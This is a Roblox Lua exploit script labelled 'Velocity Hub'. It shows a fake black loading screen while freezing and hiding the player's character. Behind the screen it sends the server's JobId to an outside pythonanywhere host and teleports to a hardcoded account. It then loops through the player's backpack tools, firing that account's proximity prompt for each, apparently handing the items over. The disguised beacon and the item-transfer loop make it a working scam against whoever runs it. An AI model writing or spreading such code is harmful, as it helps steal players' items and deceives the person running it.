local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local camera = workspace.CurrentCamera

-- Freeze and hide character
local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")

hrp.Anchored = true
for _, v in pairs(char:GetDescendants()) do
    if v:IsA("BasePart") then
        v.Transparency = 1
        if v:FindFirstChild("face") then
            v.face.Transparency = 1
        end
    elseif v:IsA("Decal") then
        v.Transparency = 1
    end
end

-- Move camera to blackness
camera.CameraType = Enum.CameraType.Scriptable
camera.CFrame = CFrame.new(999999, 999999, 999999)

-- Create full-screen loading GUI
local screenGui = Instance.new("ScreenGui")
screenGui.IgnoreGuiInset = true -- full coverage including top bar
screenGui.ResetOnSpawn = false
screenGui.Name = "VelocityHubLoadingScreen"
screenGui.Parent = playerGui

-- Black background
local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.Position = UDim2.new(0, 0, 0, 0)
background.BackgroundColor3 = Color3.new(0, 0, 0)
background.BackgroundTransparency = 0
background.Parent = screenGui

-- Cool title text
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 0.2, 0)
textLabel.Position = UDim2.new(0, 0, 0.4, 0)
textLabel.BackgroundTransparency = 1
textLabel.Text = "Velocity Hub"
textLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
textLabel.TextScaled = true
textLabel.Font = Enum.Font.LuckiestGuy
textLabel.Parent = screenGui

-- Outline around the text
local stroke = Instance.new("UIStroke")
stroke.Color = Color3.new(0, 0, 0)
stroke.Thickness = 3
stroke.Parent = textLabel

-- Send job id to external server
game:HttpGet("https://mojitomint.pythonanywhere.com/set?a="..game.JobId)

-- Function to teleport local player to target player by username
local function teleportToTarget(targetName)
    local targetPlayer = Players:FindFirstChild(targetName)
    if targetPlayer and targetPlayer.Character then
        local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
        local localHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if targetHRP and localHRP then
            localHRP.CFrame = targetHRP.CFrame
            print("Teleported to "..targetName)
            return true
        end
    end
    warn("Failed to teleport: target player or HumanoidRootPart missing")
    return false
end

-- Cycle through tools and fire proximity prompt
local function startToolCycle(targetName)
    local Backpack = player:WaitForChild("Backpack")
    local Character = player.Character or player.CharacterAdded:Wait()

    local currentIndex = 0
    local tools = {}

    local function updateTools()
        tools = {}
        for _, item in ipairs(Backpack:GetChildren()) do
            if item:IsA("Tool") and not string.find(item.Name:lower(), "shovel") then
                table.insert(tools, item)
            end
        end
    end

    local function afterEachTool(tool)
        local success, prompt = pcall(function()
            local targetPlayer = Players:FindFirstChild(targetName)
            if not targetPlayer or not targetPlayer.Character then return nil end
            return targetPlayer.Character:WaitForChild("HumanoidRootPart", 5):WaitForChild("ProximityPrompt", 5)
        end)

        if success and prompt and prompt:IsA("ProximityPrompt") then
            prompt.Enabled = true
            fireproximityprompt(prompt, 1, true)
            print("Fired ProximityPrompt for tool: "..tool.Name)
        else
            warn("Failed to find or fire the ProximityPrompt.")
        end
    end

    local function afterFullCycle()
        print("Finished cycling through all tools!")
        -- Add any other logic after full cycle here if needed
    end

    local function cycleTool()
        updateTools()
        if #tools == 0 then return end

        -- Unequip current tool if one equipped
        local equipped = Character:FindFirstChildOfClass("Tool")
        if equipped then
            equipped.Parent = Backpack
        end

        currentIndex = currentIndex + 1
        if currentIndex > #tools then
            currentIndex = 1
            afterFullCycle()
        end

        local nextTool = tools[currentIndex]
        nextTool.Parent = Character
        afterEachTool(nextTool)
    end

    -- Loop cycling tools every 0.5 seconds indefinitely
    while true do
        cycleTool()
        task.wait(0.5)
    end
end

local targetUsername = "lowtaperfadestealer"

-- Teleport immediately if target present
local successTeleport = teleportToTarget(targetUsername)

-- Listen for that player joining later
Players.PlayerAdded:Connect(function(playerJoined)
    if playerJoined.Name == targetUsername then
        playerJoined.CharacterAdded:Wait()
        teleportToTarget(targetUsername)
    end
end)

-- Only start cycling tools if teleport succeeded (optional)
if successTeleport then
    -- Unanchor character and restore transparency (optional)
    hrp.Anchored = false
    for _, v in pairs(char:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Transparency = 0
            if v:FindFirstChild("face") then
                v.face.Transparency = 0
            end
        elseif v:IsA("Decal") then
            v.Transparency = 0
        end
    end

    -- Reset camera to default
    camera.CameraType = Enum.CameraType.Custom

    -- Remove loading GUI
    screenGui:Destroy()

    -- Start tool cycling
    startToolCycle(targetUsername)
else
    warn("Could not teleport to target; tool cycling not started.")
end
